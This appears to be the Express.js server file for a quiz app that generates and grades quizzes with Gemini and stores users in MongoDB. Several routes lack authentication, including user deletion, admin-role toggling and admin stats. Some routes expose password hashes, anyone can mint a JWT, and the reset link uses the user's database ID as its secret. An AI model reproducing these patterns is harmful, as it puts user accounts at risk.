require("dotenv").config();

const { GoogleGenerativeAI } = require("@google/generative-ai");
const express = require("express");
const morgan = require("morgan");
const cors = require("cors");
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const bcrypt = require("bcrypt");
const nodemailer = require("nodemailer");
const favicon = require('serve-favicon');
const path = require('path')

const app = express();
app.use(express.json());
app.use(morgan("dev"));
app.use(
    cors({
        origin: [
            "http://localhost:3000",
            "https://quizmaniaa.vercel.app",
            "https://quiz-maniaa.vercel.app",
            "https://quizzmaniaa.vercel.app",
        ],
        credentials: true,
    })
);
app.use(cookieParser());

// Serve favicon
app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));

// MongoDB connection
const uri = `mongodb+srv://${process.env.USER_NAME}:${process.env.PASSWORD}@cluster0.4ayta.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;

// Gemini API client
const genAI = new GoogleGenerativeAI(process.env.GOOGLE_API_KEY);

const client = new MongoClient(uri, {
    serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
    },
});

async function run() {
    try {
        console.log("✅ Successfully connected to MongoDB!");

        // Database
        const database = client.db("QuizMania");

        // Quizzes Collection
        const quizzesCollection = database.collection("quizzes");

        // Users Collection
        const usersCollection = database.collection("users");

        // Reset Password Expire Collection
        const expireCollection = database.collection("expire");

        // Quiz Set Collection For Teacher Collection
        const quizSet = database.collection("quizset")

        // Submit Teacher Quiz Collection 
        const submitQuiz = database.collection("submitquiz")

        // verify token middleware
        const verifyToken = (req, res, next) => {
            // console.log("Inside the verify token");
            // console.log("received request:", req?.headers?.authorization);
            if (!req?.headers?.authorization) {
                return res.status(401).json({ message: "Unauthorized Access!" });
            }

            // get token from the headers
            const token = req?.headers?.authorization;
            // console.log("Received Token", token);

            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) {
                    console.error("JWT Verification Error:", err.message);
                    return res.status(401).json({ message: err.message });
                }
                // console.log('Decoded Token:', decoded);
                req.user = decoded;
                next();
            });
        };

        // verify admin middleware after verify token
        const verifyAdmin = async (req, res, next) => {
            const email = req.user.email;
            const query = { email: email };
            const user = await usersCollection.findOne(query);
            const isAdmin = user?.role === "admin";
            if (!isAdmin) {
                return res.status(403).send({ message: "forbidden access" });
            }
            next();
        };

        // JWT token create and remove APIS
        // JWT token create API
        app.post("/jwt/create", async (req, res) => {
            const user = req.body;
            const token = jwt.sign(user, process.env.JWT_SECRET, { expiresIn: "7h" });
            res.send({ token });
        });

        // Create quiz API
        app.post("/generate-quiz", async (req, res) => {
            const teacherAiCreated = req.query.teacherAiCreated
            if (teacherAiCreated) {
                try {
                    const { user, quizCriteria, quizCreatedType } = req.body;

                    // **Improved Prompting for Strict JSON Response**

                    const prompt = `
                        Generate a ${quizCriteria.difficulty} level quiz on "${quizCriteria.topic}" with mixed type ${quizCriteria.quizType} questions.
                        - Number of Questions: ${quizCriteria.quantity}
                        - Return ONLY a valid JSON array. No extra text.
                        - Each question should have:
                            - "type": (Multiple Choice / True or False / "fill in the blanks" / "Short Answer")
                            - "question": (Text of the question)
                            - "options": (An array of choices, required only for "Multiple Choice" and "True/False" question types. For "True/False" questions, the allowed options are only ["True", "False"] but for multiple choice there should be no true or false as  options, fill in the blanks options will be N/A and Short Answer options will be N/A)
                            - "answer": Correct answer
                            - "points" : 1
                            - "explanation" : "answer explanation" 
                        
                        Example Output:
                        [
                            {
                                "question": "5+3",
                                "answer": "8",
                                "type": "Multiple Choice",
                                "options": [
                                    "8",
                                    "2",
                                    "4",
                                    "3"
                                ],
                                "points": 1,
                                "explanation" : "answer explanation"
                            },
                            {
                                "question": "Math is easy",
                                "answer": "true",
                                "type": "true or false",
                                "options": [
                                    "true",
                                    "false"
                                ],
                                "points": 1,
                                "explanation" : "answer explanation"
                            },
                            {
                                "question": "France capital is [blank]",
                                "answer": "Canada",
                                "type": "fill in the blank",
                                "options": "N/A",
                                "points": 1,
                                "explanation" : "answer explanation"
                            },
                            {
                                "question": "Describe anything about math",
                                "answer": "only relevant question",
                                "type": "Short Answer",
                                "options": "N/A",
                                "points": 1,
                                "explanation" : "answer explanation"
                            }
                        ]
                        Do not include explanations, code blocks, or markdown. Just return raw JSON data.
                    `;

                    // Call Gemini API to generate content
                    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });

                    const response = await model.generateContent([prompt]);

                    const quizData = response.response.candidates[0].content.parts[0].text;
                    // const demo = response.response

                    // console.log("🔹 Raw AI Response:", quizData);

                    // **Extract JSON if wrapped in extra text**
                    const jsonMatch = quizData.match(/```json([\s\S]*?)```/);
                    const cleanJson = jsonMatch ? jsonMatch[1].trim() : quizData;

                    // Parse the quiz data
                    let parsedQuizData;
                    try {
                        parsedQuizData = JSON.parse(cleanJson);
                    } catch (error) {
                        console.error("❌ JSON Parsing Error:", error);
                        throw new Error("Invalid JSON format received from AI.");
                    }

                    const updatedData = {
                        user,
                        quizCriteria,
                        parsedQuizData,
                        quizCreatedType
                    };

                    const result = await quizSet.insertOne(updatedData);

                    // Send the response
                    res.json({
                        status: true,
                        message: "✅ Successfully generated quiz from AI",
                        result,
                        user,
                        quizCriteria,
                        quizzes: parsedQuizData,
                    });
                } catch (err) {
                    console.error("❌ Error generating quiz:", err);
                    res.status(500).json({ status: false, message: err.message });
                }
            }
            else {
                try {
                    const { user, quizCriteria } = req.body;

                    // **Improved Prompting for Strict JSON Response**

                    const prompt = `
                        Generate a ${quizCriteria.difficulty} level quiz on "${quizCriteria.topic}" with ${quizCriteria.quizType} questions.
                        - Number of Questions: ${quizCriteria.quantity}
                        - Return ONLY a valid JSON array. No extra text.
                        - Each question should have:
                            - "type": (Multiple Choice / True or False)
                            - "question": (Text of the question)
                            - "options": (An array of choices, required only for "Multiple Choice" and "True/False" question types. For "True/False" questions, the allowed options are only ["True", "False"] but for multiple choice there should be no true or false as  options)
                            - "answer": (Correct answer)
                        
                        Example Output:
                        [
                            {
                                "type": "Multiple Choice",
                                "question": "What is the capital of France?",
                                "options": ["Berlin", "Paris", "Madrid", "Rome"],
                                "answer": "Paris"
                            }
                        ]
                        Do not include explanations, code blocks, or markdown. Just return raw JSON data.
                    `;

                    // Call Gemini API to generate content
                    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });

                    const response = await model.generateContent([prompt]);

                    const quizData = response.response.candidates[0].content.parts[0].text;
                    // const demo = response.response

                    // console.log("🔹 Raw AI Response:", quizData);

                    // **Extract JSON if wrapped in extra text**
                    const jsonMatch = quizData.match(/```json([\s\S]*?)```/);
                    const cleanJson = jsonMatch ? jsonMatch[1].trim() : quizData;

                    // Parse the quiz data
                    let parsedQuizData;
                    try {
                        parsedQuizData = JSON.parse(cleanJson);
                    } catch (error) {
                        console.error("❌ JSON Parsing Error:", error);
                        throw new Error("Invalid JSON format received from AI.");
                    }

                    const updatedData = {
                        user,
                        quizCriteria,
                        parsedQuizData,
                    };

                    const result = await quizzesCollection.insertOne(updatedData);

                    // Send the response
                    res.json({
                        status: true,
                        message: "✅ Successfully generated quiz from AI",
                        result,
                        user,
                        quizCriteria,
                        quizzes: parsedQuizData,
                    });
                } catch (err) {
                    console.error("❌ Error generating quiz:", err);
                    res.status(500).json({ status: false, message: err.message });
                }
            }

        });

        // Create quiz API for Teacher API
        app.post('/teacher/generate-quiz', async (req, res) => {
            try {
                const { user, ...teacherCreatedQuiz } = req.body

                const userExist = await usersCollection.findOne({ email: user })
                // if(userExist?.role=="teacher")
                const result = await quizSet.insertOne(req.body)
                const insertedQuiz = await quizSet.findOne({ _id: new ObjectId(result?.insertedId) })
                res.json({
                    status: true,
                    result,
                    insertedQuiz
                })
            }
            catch (err) {
                console.error("❌ Error checking quiz:", err);
                res.status(500).json({ status: false, message: err.message });
            }
        })

        // get the quiz set that user just created API
        app.get("/get-quiz-set/:id", async (req, res) => {
            const id = req.params.id;
            const result = await quizzesCollection.findOne({ _id: new ObjectId(id) });
            if (!result) {
                return res.json({
                    status: false,
                    message: "Quiz Not Found"
                })
            }
            res.json(result);
        });

        // Get the Teacher Created Quiz API 
        app.get('/teacher/generate-quiz/:id', async (req, res) => {
            const id = req.params.id;
            const result = await quizSet.findOne({ _id: new ObjectId(id) });
            res.json(result);
        });

        // checking the quiz answer API
        app.post("/answer/checking", async (req, res) => {
            const isTeacherCreated = req.query.teacherCreated

            if (isTeacherCreated) {
                try {
                    const body = req.body;
                    const submissionExist = await submitQuiz.findOne({ id: body?.id, user: body?.user })
                    if (submissionExist) {
                        return res.json({
                            status: false,
                            message: "You Already Responded!"
                        })
                    }
                    const result = await submitQuiz.insertOne(body)
                    const createdQuiz = await quizSet.findOne({ _id: new ObjectId(body?.id) })
                    const parsedQuiz = createdQuiz?.parsedQuizData

                    let correctQuizSet = await submitQuiz.findOne({ _id: new ObjectId(result?.insertedId) })

                    const totalQuizInSet = parsedQuiz.length;
                    let correctQuizAnswer = 0; // ✅ Initialize properly

                    const updatePromises = correctQuizSet?.answers?.map(async (answer, index) => {
                        const createdQuestion = parsedQuiz[index]

                        if (answer?.type == "Multiple Choice" || answer?.type == "true or false") {
                            if (
                                createdQuestion.question === answer.question &&
                                createdQuestion.answer === answer.userAnswer
                            ) {
                                correctQuizAnswer++; // ✅ Synchronously update count
                            }

                            return submitQuiz.updateOne(
                                {
                                    _id: new ObjectId(result?.insertedId),
                                    "answers.question": createdQuestion.question,
                                },
                                {
                                    $set: {
                                        "answers.$.status":
                                            answer.userAnswer === createdQuestion.answer
                                                ? "correct"
                                                : "wrong",
                                    },
                                }
                            );
                        }
                        else {
                            if (!createdQuestion.question === answer.question) {
                                return
                            }

                            const prompt = `
                                Analyze the given teacher's answer: "${createdQuestion?.answer}" and the user's answer: "${answer?.userAnswer}" based on the question type: "${answer?.type}".

                                Rules:
                                    - If the type is "Short Answer", check if the semantic meaning matches. If it matches, output 'correct', otherwise 'incorrect'.
                                    - If the type is "fill in the blank", require an exact match (case-insensitive). If matched, output 'correct', otherwise 'incorrect'.

                                Output Format:
                                {
                                    "output": "correct" or "incorrect"
                                }

                                Only output the JSON. No explanations, no extra text.
                            `;

                            // Call Gemini API to generate content
                            const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });

                            const response = await model.generateContent([prompt]);

                            const correctStatus = response.response.candidates[0].content.parts[0].text;
                            // console.log("AI Given Question Answer : ", correctStatus);

                            // **Extract JSON if wrapped in extra text**
                            const jsonMatch = correctStatus.match(/```json([\s\S]*?)```/);
                            const cleanJson = jsonMatch ? jsonMatch[1].trim() : quizData;

                            // Parse the quiz data
                            let parsedCorrectStatus;
                            try {
                                parsedCorrectStatus = JSON.parse(cleanJson);
                            } catch (error) {
                                console.error("❌ JSON Parsing Error:", error);
                                throw new Error("Invalid JSON format received from AI.");
                            }

                            console.log(parsedCorrectStatus);

                            if (parsedCorrectStatus?.output == "correct") {
                                correctQuizAnswer++; // ✅ Synchronously update count
                                return submitQuiz.updateOne(
                                    {
                                        _id: new ObjectId(result?.insertedId),
                                        "answers.question": createdQuestion.question,
                                    },
                                    {
                                        $set: {
                                            "answers.$.status": "correct"
                                        },
                                    }
                                );

                            }
                            if (parsedCorrectStatus?.output == "incorrect") {
                                return submitQuiz.updateOne(
                                    {
                                        _id: new ObjectId(result?.insertedId),
                                        "answers.question": createdQuestion.question,
                                    },
                                    {
                                        $set: {
                                            "answers.$.status": "wrong",
                                        },
                                    }
                                );
                            }

                            // console.log(parsedCorrectStatus);
                        }
                    })

                    await Promise.all(updatePromises)

                    // ✅ Update correct & incorrect answer counts in the database
                    await submitQuiz.updateOne(
                        { _id: new ObjectId(result?.insertedId) },
                        {
                            $set: {
                                correctQuizAnswer,
                                wrongQuizAnswer: totalQuizInSet - correctQuizAnswer,
                                status: "solved",
                            },
                        }
                    );

                    // override quizSet
                    correctQuizSet = await submitQuiz.findOne({ _id: new ObjectId(result?.insertedId) });

                    res.json({
                        status: true,
                        teacherSolvedQuiz: true,
                        quizSet: {
                            createdQuiz,
                            parsedQuizData: correctQuizSet,
                            correctQuizAnswer, // ✅ Now this should not be NaN
                        },
                        wrongQuizAnswer: totalQuizInSet - correctQuizAnswer, // ✅ Ensure correct value
                    })
                }
                catch (err) {
                    console.error("❌ Error checking quiz:", err);
                    res.status(500).json({ status: false, message: err.message });
                }
            }
            else {
                try {
                    const { id, answers } = req.body;
                    let quizSet = await quizzesCollection.findOne({
                        _id: new ObjectId(id),
                    });

                    if (!quizSet) {
                        return res.json({ status: false, message: "Quiz not found" });
                    }

                    const totalQuizInSet = quizSet.parsedQuizData.length;
                    let correctQuizAnswer = 0; // ✅ Initialize properly

                    const updatePromises = answers.map((answer, index) => {
                        const quizQuestion = quizSet.parsedQuizData[index];

                        if (
                            quizQuestion.question === answer.question &&
                            quizQuestion.answer === answer.userAnswer
                        ) {
                            correctQuizAnswer++; // ✅ Synchronously update count
                        }

                        return quizzesCollection.updateOne(
                            {
                                _id: new ObjectId(id),
                                "parsedQuizData.question": quizQuestion.question,
                            },
                            {
                                $set: {
                                    "parsedQuizData.$.userAnswer": answer.userAnswer,
                                    "parsedQuizData.$.status":
                                        answer.userAnswer === quizQuestion.answer
                                            ? "correct"
                                            : "wrong",
                                },
                            }
                        );
                    });

                    await Promise.all(updatePromises); // ✅ Wait for all updates

                    // ✅ Update correct & incorrect answer counts in the database
                    await quizzesCollection.updateOne(
                        { _id: new ObjectId(id) },
                        {
                            $set: {
                                correctQuizAnswer,
                                wrongQuizAnswer: totalQuizInSet - correctQuizAnswer,
                                status: "solved",
                            },
                        }
                    );

                    // override quizSet
                    quizSet = await quizzesCollection.findOne({ _id: new ObjectId(id) });

                    res.json({
                        status: true,
                        totalQuizInSet,
                        quizSet,
                        correctQuizAnswer, // ✅ Now this should not be NaN
                        wrongQuizAnswer: totalQuizInSet - correctQuizAnswer, // ✅ Ensure correct value
                    });
                }
                catch (err) {
                    console.error("❌ Error checking quiz:", err);
                    res.status(500).json({ status: false, message: err.message });
                }
            }
        });

        // stored user into the mongodb API
        app.post("/signup", async (req, res) => {
            try {
                const { sociallogin } = req.query;

                if (sociallogin) {
                    const body = req.body;
                    const existingUser = await usersCollection.findOne({
                        email: body?.email,
                    });

                    if (existingUser) {
                        return res.json({
                            status: false,
                            message: "User already exists, use another email address",
                            data: null,
                        });
                    }

                    const updateBody = {
                        ...body,
                        role: "user",
                        failedAttempts: 0,
                        block: false,
                    };

                    const result = await usersCollection.insertOne(updateBody);
                    return res.json({
                        status: true,
                        message: "User added successfully",
                        data: result,
                    });
                } else {
                    const { password, ...user } = req.body;
                    const existingUser = await usersCollection.findOne({
                        email: user?.email,
                    });

                    if (existingUser) {
                        return res.json({
                            status: false,
                            message: "User already exists, use another email address",
                            data: null,
                        });
                    }

                    const hashedPass = await bcrypt.hash(password, 10);
                    const withRole = {
                        ...user,
                        password: hashedPass,
                        role: "user",
                        failedAttempts: 0,
                        block: false,
                    };

                    const insertResult = await usersCollection.insertOne(withRole);
                    return res.json({
                        status: true,
                        message: "User added successfully",
                        data: insertResult,
                    });
                }
            } catch (error) {
                console.error("Error adding/updating user:", error);
                res.status(500).json({
                    status: false,
                    message: "Failed to add or update user",
                    error: error.message,
                });
            }
        });

        // get a user from the mongodb by email API
        app.post("/signin/:email", async (req, res) => {
            const email = req.params.email;

            const { password, ...userInfo } = req.body;

            let user = await usersCollection.findOne({ email });
            if (!user) {
                res.json({ status: false, message: "User not found" });
                return;
            }

            if (user?.block) {
                res.json({
                    status: false,
                    message: "This Email has been blocked, Please contact with admin!",
                });
                return;
            }

            const match = await bcrypt.compare(password, user?.password);

            if (!match) {
                if (user?.failedAttempts == 4) {
                    await usersCollection.updateOne(
                        { email: email },
                        {
                            $set: {
                                block: true,
                            },
                        }
                    );
                    res.json({
                        status: false,
                        message: "Your Email Has been blocked Please contact with admin!",
                    });
                    return;
                } else {
                    const updateFailedAttempts = {
                        $inc: {
                            failedAttempts: 1,
                        },
                    };
                    await usersCollection.updateOne(
                        { email: email },
                        updateFailedAttempts
                    );
                    user = await usersCollection.findOne({ email: email });
                    res.json({
                        status: false,
                        message: `Incorrect Password, Left ${5 - user?.failedAttempts
                            } Attempts`,
                        failedAttempts: user?.failedAttempts,
                    });
                    return;
                }
            }

            await usersCollection.updateOne(
                { email: email },
                {
                    $set: {
                        failedAttempts: 0,
                    },
                }
            );

            const updatedData = {
                $set: {
                    lastLoginTime: userInfo?.lastLoginTime,
                },
            };

            await usersCollection.updateOne({ email: user?.email }, updatedData);
            res.json({
                status: true,
                userInfo: user,
                message: "Login Successfully",
            });
        });

        // get user for auth js API
        app.get("/signin/:email", async (req, res) => {
            const email = req.params.email;
            const userExist = await usersCollection.findOne({ email: email });
            if (!userExist) {
                res.json({ status: false, message: "User Not Found" });
                return;
            }
            res.json({
                status: true,
                userInfo: userExist,
            });
        });

        // update user info API
        app.patch("/user/update/profile/:id", async (req, res) => {
            try {
                const id = req.params.id;

                if (!ObjectId.isValid(id)) {
                    return res
                        .status(400)
                        .json({ status: false, message: "Invalid user ID" });
                }

                const body = req.body;
                const updatedDoc = {
                    $set: {
                        username: body?.username,
                        phone: body?.phone,
                    },
                };

                const result = await usersCollection.updateOne(
                    { _id: new ObjectId(id) },
                    updatedDoc
                );

                if (result.matchedCount === 0) {
                    return res
                        .status(404)
                        .json({ status: false, message: "User not found" });
                }

                res.status(200).json({
                    status: true,
                    message: "User profile updated successfully",
                    result,
                });
            } catch (error) {
                console.error("Error updating user profile:", error);
                res.status(500).json({
                    status: false,
                    message: "Something went wrong",
                    error: error.message,
                });
            }
        });

        // delete user from db API
        app.delete("/user/delete/:id", async (req, res) => {
            try {
                const id = req.params.id;

                if (!ObjectId.isValid(id)) {
                    return res
                        .status(400)
                        .json({ status: false, message: "Invalid user ID" });
                }

                const result = await usersCollection.deleteOne({ _id: new ObjectId(id) });

                if (result.deletedCount === 0) {
                    return res
                        .status(404)
                        .json({ status: false, message: "User not found" });
                }

                res.status(200).json({
                    status: true,
                    message: "User deleted successfully",
                    result,
                });
            } catch (error) {
                console.error("Error deleting user:", error);
                res.status(500).json({
                    status: false,
                    message: "Something went wrong",
                    error: error.message,
                });
            }
        });

        // change role of user API
        app.patch("/user/role/change/:id", async (req, res) => {
            try {
                const id = req.params.id;
                const user = await usersCollection.findOne({ _id: new ObjectId(id) });

                if (!ObjectId.isValid(id)) {
                    return res
                        .status(400)
                        .json({ status: false, message: "Invalid user ID" });
                }

                if (!role) {
                    return res
                        .status(400)
                        .json({ status: false, message: "Role is required" });
                }

                const updatedDoc = {
                    $set: {
                        role: user?.role == "admin" ? "user" : "admin",
                    },
                };

                const result = await usersCollection.updateOne(
                    { _id: new ObjectId(id) },
                    updatedDoc
                );

                if (result.matchedCount === 0) {
                    return res
                        .status(404)
                        .json({ status: false, message: "User not found" });
                }

                res.status(200).json({
                    status: true,
                    message: "User role updated successfully",
                    result,
                });
            } catch (error) {
                console.error("Error updating user role:", error);
                res.status(500).json({
                    status: false,
                    message: "Something went wrong",
                    error: error.message,
                });
            }
        });

        // reset password API
        app.get("/reset-password/:email", async (req, res) => {
            const email = req.params.email;
            const userExist = await usersCollection.findOne({ email: email });
            if (!userExist) {
                res.json({ status: false, message: "User Not Found!" });
                return;
            }

            const expireUserExist = await expireCollection.findOne({ email: email });

            if (!expireUserExist) {
                await expireCollection.insertOne({
                    email: email,
                    expiresAt: new Date(Date.now() + 1000 * 60 * 5), // 5 min
                });
            }

            if (expireUserExist) {
                await expireCollection.updateOne(
                    { email: email },
                    {
                        $set: {
                            expiresAt: new Date(Date.now() + 1000 * 60 * 5), // 5 min
                        },
                    }
                );
            }

            const html = `
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Reset Your Password - QuizMania</title>
                <style>
                  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
            
                  body {
                    font-family: 'Poppins', sans-serif;
                    background-color: #f3f4f6;
                    margin: 0;
                    padding: 0;
                    color: #1f2937;
                  }
            
                  .email-container {
                    max-width: 600px;
                    margin: 40px auto;
                    background-color: #ffffff;
                    border-radius: 10px;
                    overflow: hidden;
                    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
                  }
            
                  .email-header {
                    background-color: #8b5cf6;
                    padding: 30px 20px;
                    text-align: center;
                  }
            
                  .logo {
                    font-size: 26px;
                    font-weight: 700;
                    color: #ffffff;
                    letter-spacing: 1px;
                  }
            
                  .email-body {
                    padding: 40px 30px;
                  }
            
                  .greeting {
                    font-size: 20px;
                    font-weight: 600;
                    margin-bottom: 20px;
                  }
            
                  .message {
                    font-size: 16px;
                    line-height: 1.6;
                    margin-bottom: 25px;
                  }
            
                  .reset-button {
                    display: inline-block;
                    background-color: #8b5cf6;
                    color: #ffffff !important;
                    text-decoration: none;
                    padding: 14px 36px;
                    border-radius: 8px;
                    font-weight: 600;
                    font-size: 16px;
                    transition: background-color 0.3s ease;
                  }
            
                  .reset-button:hover {
                    background-color: #7c3aed;
                  }
            
                  .warning {
                    font-size: 14px;
                    color: #6b7280;
                    margin-top: 30px;
                    font-style: italic;
                  }
            
                  .email-footer {
                    background-color: #f9fafb;
                    padding: 20px;
                    text-align: center;
                    font-size: 14px;
                    color: #6b7280;
                  }
            
                  @media only screen and (max-width: 600px) {
                    .email-body {
                      padding: 30px 20px;
                    }
            
                    .reset-button {
                      width: 100%;
                      padding: 14px 0;
                    }
            
                    .logo {
                      font-size: 22px;
                    }
                  }
                </style>
              </head>
              <body>
                <div class="email-container">
                  <div class="email-header">
                    <div class="logo">QuizMania</div>
                  </div>
                  <div class="email-body">
                    <div class="greeting">Hi, ${userExist.username}</div>
                    <div class="message">
                      We received a request to reset the password associated with your QuizMania account.
                      Click the button below to continue with the reset process.
                    </div>
                    <a href="https://quizzmaniaa.vercel.app/auth/reset-password?secretcode=${userExist?._id
                }" class="reset-button">Reset Password</a>
                    <div class="warning">
                      This link will expire in 5 minutes for your security. If you didn’t request this, no action is required.
                    </div>
                  </div>
                  <div class="email-footer">
                    &copy; ${new Date().getFullYear()} QuizMania. All rights reserved.
                  </div>
                </div>
              </body>
            </html>
            `;

            const transporter = nodemailer.createTransport({
                service: "gmail",
                auth: {
                    user: process.env.GOOGLE_ACCOUNT_USER,
                    pass: process.env.GOOGLE_ACCOUNT_PASS,
                },
            });

            const info = await transporter.sendMail({
                from: `"QuizMania" <noreply@quizmania.com>`,
                to: email,
                subject: `Reset your QuizMania password`,
                html: html,
            });

            res.json({
                status: true,
                message: "Email send successfully, Check inbox or spam of email",
                email: email,
                info: info,
            });
        });

        // reset password request confirmation API
        app.patch("/reset-password/:id", async (req, res) => {
            try {
                const id = req.params.id;
                const { password } = req.body;

                const user = await usersCollection.findOne({ _id: new ObjectId(id) });

                const expireUser = await expireCollection.findOne({
                    email: user?.email,
                });

                const now = new Date();
                const expiresAt = new Date(expireUser?.expiresAt);

                const fiveMinutesInMs = 1000 * 60 * 5;

                if (now.getTime() - expiresAt.getTime() > fiveMinutesInMs) {
                    res.json({ expired: true });
                    return;
                }

                if (!user) {
                    return res.status(404).json({
                        status: false,
                        message: "User not found",
                    });
                }

                const hashedPass = await bcrypt.hash(password, 10);

                const updateDoc = {
                    $set: { password: hashedPass },
                };

                await usersCollection.updateOne({ _id: new ObjectId(id) }, updateDoc);

                res.json({
                    status: true,
                    message: "Password successfully changed",
                });
            } catch (err) {
                console.error("Reset password error:", err);
                res.status(500).json({
                    status: false,
                    message: "Internal server error",
                });
            }
        });

        // admin stats for showing data in admin dashboard API
        app.get("/admin/stats", async (req, res) => {
            try {
                const users = await usersCollection.find().toArray();
                const quizzes = await quizzesCollection.find().toArray();
                const solvedQuizzes = await quizzesCollection
                    .find({ status: "solved" })
                    .toArray();

                const usersWithQuizCounts = await Promise.all(
                    users.map(async (user) => {
                        const quizCount = await quizzesCollection.countDocuments({
                            user: user.email,
                        });
                        const lastActive = new Date(user.lastLoginTime);
                        const now = new Date();
                        const diffInHours = (now - lastActive) / (1000 * 60 * 60);
                        const userStatus = diffInHours > 24 ? "offline" : "online";
                        return {
                            ...user,
                            totalQuizzes: quizCount,
                            userStatus,
                        };
                    })
                );

                const quizzesWithAuthorName = await Promise.all(
                    quizzes.map(async (quiz) => {
                        const author = await usersCollection.findOne({ email: quiz.user });
                        return {
                            ...quiz,
                            author: author?.username,
                        };
                    })
                );

                const now = new Date();
                const startOfMonth = new Date(now.getFullYear(), now.getMonth(), 1);
                const startOfNextMonth = new Date(
                    now.getFullYear(),
                    now.getMonth() + 1,
                    1
                );

                // This works for both string and Date creationTime
                const monthWishUsers = await usersCollection.find({
                    $expr: {
                        $and: [
                            { $gte: [{ $dateFromString: { dateString: "$creationTime" } }, startOfMonth] },
                            { $lt: [{ $dateFromString: { dateString: "$creationTime" } }, startOfNextMonth] }
                        ]
                    }
                }).toArray();

                res.json({
                    status: true,
                    users: usersWithQuizCounts.length === 0 ? [] : usersWithQuizCounts,
                    quizzes: quizzesWithAuthorName.length === 0 ? [] : quizzesWithAuthorName,
                    solvedQuizzes: solvedQuizzes.length === 0 ? [] : solvedQuizzes,
                    monthWishUsers,
                    startOfMonth,
                    startOfNextMonth
                });

            } catch (error) {
                console.error("Error fetching admin stats:", error);
                res.status(500).json({ status: false, message: "Server error" });
            }
        });

        // teacher stats for showing data in teacher dashboard API 
        app.get('/teacher/stats', async (req, res) => {
            try {
                const teacherEmail = req.query.teacherEmail
                const isNotTeacherExist = await usersCollection.findOne({ email: teacherEmail, role: "teacher" })
                if (!isNotTeacherExist) {
                    return res.json({
                        status: false,
                        message: "This person in not teacher?"
                    })
                }

                const createdQuizzes = await quizSet.find({ user: teacherEmail }).toArray()

                const withAttempts = await Promise.all(
                    createdQuizzes.map(async (quiz) => {
                        const totalAttempt = await submitQuiz.find({ id: quiz._id.toString() }).toArray();
                        return{
                            ...quiz,
                            totalAttempt:totalAttempt.length
                        }
                    })
                )

                res.json({
                    status: true,
                    isNotTeacherExist,
                    withAttempts
                })

            }
            catch (err) {
                res.status(500).json({ status: false, message: err.message });
            }
        })

        // user stats for showing data in user dashboard API
        app.get("/user/stats/:email", async (req, res) => {
            const email = req.params.email;
            const totalQuiz = await quizzesCollection.find({ user: email }).toArray();

            const solvedQuiz = await quizzesCollection
                .find({ user: email, status: "solved" })
                .toArray();

            const totalCorrect = solvedQuiz.reduce(
                (sum, quiz) => sum + quiz.correctQuizAnswer,
                0
            );

            const totalPossible = solvedQuiz.reduce(
                (sum, quiz) => sum + quiz.parsedQuizData.length,
                0
            );

            const percentage = (totalCorrect / totalPossible) * 100;

            res.json({
                status: true,
                totalQuiz: totalQuiz.length === 0 ? [] : totalQuiz,
                solvedQuiz: solvedQuiz.length === 0 ? [] : solvedQuiz,
                averageMark: isNaN(parseFloat(percentage))
                    ? 0 + "%"
                    : parseInt(percentage) + "%",
            });
        });

        // Delete quiz API
        app.delete("/delete-quiz/:id", async (req, res) => {
            try {
                const id = req.params.id;

                if (!ObjectId.isValid(id)) {
                    return res.status(400).json({
                        status: false,
                        message: "Invalid quiz ID format",
                    });
                }

                const quizId = new ObjectId(id);
                const quiz = await quizzesCollection.findOne({ _id: quizId });

                if (!quiz) {
                    return res.status(404).json({
                        status: false,
                        message: "Quiz not found",
                    });
                }

                const result = await quizzesCollection.deleteOne({ _id: quizId });

                if (!result.acknowledged || result.deletedCount === 0) {
                    return res.status(500).json({
                        status: false,
                        message: "Failed to delete quiz",
                    });
                }

                res.json({
                    status: true,
                    message: "Quiz deleted successfully",
                });
            } catch (err) {
                console.error(`❌ Error deleting quiz with ID ${req.params.id}:`, err);
                res.status(500).json({
                    status: false,
                    message: "Internal server error",
                });
            }
        });
    } catch (error) {
        console.error("❌ MongoDB Connection Error:", error);
    }
}
run().catch(console.dir);

// Root route
app.get("/", (req, res) => {
    res.json({ message: "🚀 Yoo Server is running well!!" });
});

